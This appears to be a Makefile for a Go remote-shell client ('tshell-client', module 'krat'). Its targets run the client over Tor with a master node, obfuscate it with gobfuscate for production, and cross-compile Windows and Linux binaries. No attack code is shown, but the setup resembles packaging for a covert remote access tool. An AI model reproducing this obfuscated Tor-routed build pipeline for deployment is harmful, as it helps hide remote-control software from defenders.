run:
	DEBUG=true USER_DATA_DIR=./tor MASTER_NODE=localhost go run cmd/tshell-client/main.go
prepare:
	echo "Compiling go-libtor, This is going to take a while, sit tight."
	go get -u -v -x github.com/ipsn/go-libtor
production:
	go get -u github.com/unixpickle/gobfuscate
	go run github.com/unixpickle/gobfuscate github.com/humbertovnavarro/krat cmd/tshell-client/main.go
testing:
	GOOS=windows GOARCH=386 go build  -o ./out/testing/tshell-client.exe cmd/tshell/main.go
	GOOS=windows GOARCH=amd64 go build  -o ./out/testing/tshell64-client.exe cmd/tshell/main.go
	GOOS=linux GOARCH=386 go build  -o ./out/testing/tshell32-client cmd/tshell/main.go
	GOOS=linux GOARCH=amd64 go build  -o ./out/testing/tshell-client cmd/tshell/main.go
